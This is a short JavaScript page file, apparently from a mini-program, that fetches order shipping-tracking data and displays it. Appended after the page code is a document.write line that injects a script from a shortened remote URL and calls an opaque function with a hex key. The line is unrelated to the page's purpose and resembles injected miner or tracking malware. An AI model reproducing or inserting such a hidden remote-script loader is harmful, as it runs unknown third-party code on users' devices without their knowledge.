var t = getApp(),
  s = t.requirejs("core");
Page({
  data: {},
  onLoad: function (s) {
    this.setData({
      options: s
    }),
      t.url(s),
      this.get_list()
  },
  get_list: function () {
    var t = this;
    s.get("order/express", t.data.options, function (e) {
      0 == e.error ? (e.show = true, t.setData(e)) : s.toast(e.message, "loading")
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
